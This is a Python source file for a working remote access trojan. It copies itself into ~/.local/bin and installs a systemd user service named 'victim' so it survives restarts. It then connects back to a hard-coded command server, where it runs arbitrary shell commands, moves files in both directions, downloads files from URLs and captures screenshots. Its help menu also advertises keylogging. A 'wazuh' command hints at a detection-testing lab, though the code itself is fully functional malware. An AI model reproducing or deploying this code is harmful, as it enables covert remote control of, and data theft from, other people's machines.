# !/usr/bin/python
import subprocess
import sys
import base64
import json
import socket
import os
import shutil
import time
import requests
from mss import mss
import threading

admin = ""

# s = None
# SERVER_ADDRESS = "192.168.1.128"
SERVER_ADDRESS = "10.177.186.2"
SERVER_PORT = 54321


def persistence():
    if getattr(sys, 'frozen', False):
        script_location = sys.executable
    else:
        script_location = __file__

    location = os.path.expanduser("~/.local/bin/victim")
    service_file = os.path.expanduser("~/.config/systemd/user/victim.service")

    if not os.path.exists(location):
        os.makedirs(os.path.dirname(location), exist_ok=True)
        shutil.copyfile(script_location, location)
        os.chmod(location, 0o755)

    if not os.path.exists(service_file):
        os.makedirs(os.path.dirname(service_file), exist_ok=True)
        with open(service_file, 'w') as f:
            f.write(f"""
                    [Unit]
                    Description=Run victim at startup

                    [Service]
                    ExecStart={location}

                    [Install]
                    WantedBy=default.target
                    """)

        subprocess.call(['systemctl', '--user', 'enable', 'victim.service'])
        subprocess.call(['systemctl', '--user', 'start', 'victim.service'])


def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_ADDRESS, SERVER_PORT))
            shell()
        except Exception as e:
            print("Error when connect > ", e)
            connection()


def reliable_send(data):
    global s
    try:
        print("reliable_send(data) = ", data.decode())
        json_data = data.decode()
        json_data = json.dumps(json_data)
        json_data = json_data.encode('utf-8')
        print("json_data = json.dumps(data.decode())= ", json_data)
        s.send(json_data)
    except Exception as e:
        print("Eroare în timpul trimiterii datelor către server:", e)


def reliable_recv():
    global s
    try:

        print("reliable_recv()")
        data = ""
        while True:
            try:
                print("while True")
                chunk_recv = s.recv(1024).decode()
                print("chunk_recv = ", str(chunk_recv))
                if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
                    print("not chunk_recv or len(chunk_recv)")
                    break
                data = data + chunk_recv
                print("data.decode('utf-8') = ", data)
                print("json.loads(data) = ", json.loads(data))
                return json.loads(data)
            except ValueError:
                continue

    except Exception as e:
        print("Eroare în timpul primirii datelor de la server:", e)
        return None


def download_to_pc_from_url(url):
    print("download_to_pc_from_url")
    get_response = requests.get(url)
    print("get_response = ", get_response)
    file_name = url.split("/")[-1]
    print("file_name = ", file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def get_from_url(command):
    try:
        download_to_pc_from_url(command[4:])
        reliable_send("[+] Downloaded file from url".encode())
    except Exception as e:
        reliable_send(f"[!!] Downloaded failed file from url:{e}".encode())


def screenshot():
    with mss() as ss:
        filename = ss.shot(output="monitor-1.png")
        return filename


def handle_screenshot():
    try:
        filename = screenshot()
        with open(filename, "rb") as sc:
            reliable_send(base64.b64encode(sc.read()))
        os.remove(filename)
    except Exception as e:
        error_message = f"[!!] Could not take screenshot: {e}"
        reliable_send(base64.b64encode(error_message.encode()))


def is_admin():
    global admin
    try:
        temp = os.listdir('/root')
    except PermissionError:
        admin = "[!!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"


def help_menu():
    help_options = '''
                    upload path     --> Upload a File To Target PC
                    download path   --> Download A File From Target PC
                    get url         --> Download A File To Target PC From Any Website
                    start path      --> Start a Program on Target PC
                    screenshot      --> Take A Screenshot Of Target's Monitor
                    check           --> Check For The Administrator Privileges
                    keylog_dump     --> Get victim keyboard activity
                    keylog_start    --> Start keylogger on victim machine
                    q               --> Exit The Reverse Shell
                    '''
    reliable_send(help_options.encode())


def change_directory(command):
    try:
        parts = command.strip().split()
        new_dir = parts[1]
        os.chdir(new_dir)
        reliable_send(f"Changed directory to {new_dir}".encode())
    except Exception as e:
        reliable_send(f"Error changing directory: {e}".encode())


def upload_file(command):
    try:
        print("primesc ", command)
        with open(command[7:], "wb") as fin:
            file_data = reliable_recv()
            fin.write(base64.b64decode(file_data))
    except Exception as e:
        reliable_send(f"Error uploading file: {e}".encode())


def download_file(command):
    try:
        with open(command[9:], "rb") as file:
            reliable_send(base64.b64encode(file.read()))
    except Exception as e:
        reliable_send(f"Error downloading file: {e}".encode())


def check_if_admin():
    try:
        is_admin()
        reliable_send(admin.encode())
    except Exception as e:
        reliable_send(f"[!!] Can not perform the check: {e}".encode())

def check_wazuh(command):
    try:
        print(f"check_wazuh() {command[6:]}")
        proc = subprocess.Popen(command[6:],
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        result = stdout + stderr
        print("result WAZUUUUUUHHHH IS BYTES?  = ", isinstance(result, bytes))
        reliable_send(result)
    except Exception as e:
        reliable_send(f"[!!] Error executing heartbeat: {e}".encode())

def start_application_on_victim(command):
    try:
        application = command[6:]
        if application.endswith(".txt"):
            subprocess.Popen(["nano", application], shell=False)
        elif application.endswith(".py"):
            subprocess.Popen(["python3", application], shell=False)
        elif application.endswith(".sh"):
            subprocess.Popen(["bash", application], shell=False)
        elif os.access(application, os.X_OK):
            subprocess.Popen([application], shell=False)
        else:
            subprocess.Popen(application, shell=True)

        reliable_send(f"[+] Started {application}!".encode())
    except Exception as e:
        reliable_send(f"[!!!] Failed To Start {application}: {str(e)}".encode())


def exec_cmd(command):
    proc = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    print("result IS BYTES?  = ", isinstance(result, bytes))
    reliable_send(result)


def shell():
    global admin
    while True:
        try:
            command = reliable_recv()
            print(command)
            if command == 'q':
                continue
            elif command.strip().startswith("wazuh") and len(command.strip()) > len("wazuh "):
                print(f"COMANDA E WAZUH : {command.strip().startswith('wazuh')}")
                check_wazuh(command)
            elif command == "exit":
                break
            elif command == "help":
                help_menu()
            elif command.strip().startswith("cd") and len(command.strip()) > 2:
                change_directory(command)

            elif command.strip().startswith("download") and len(command.strip()) > len("download "):
                download_file(command)

            elif command.strip().startswith("upload") and len(command.strip()) > len("upload "):
                upload_file(command)

            elif command.strip().startswith("get") and len(command.strip()) > len("get "):
                get_from_url(command)

            elif command.strip().startswith("screenshot"):
                handle_screenshot()

            elif command.strip().startswith("check"):
                check_if_admin()

            elif command.strip().startswith("start"):
                start_application_on_victim(command)

            else:
                exec_cmd(command)
        except (ConnectionResetError, ConnectionAbortedError):
            connection()


persistence()
connection()
s.close()
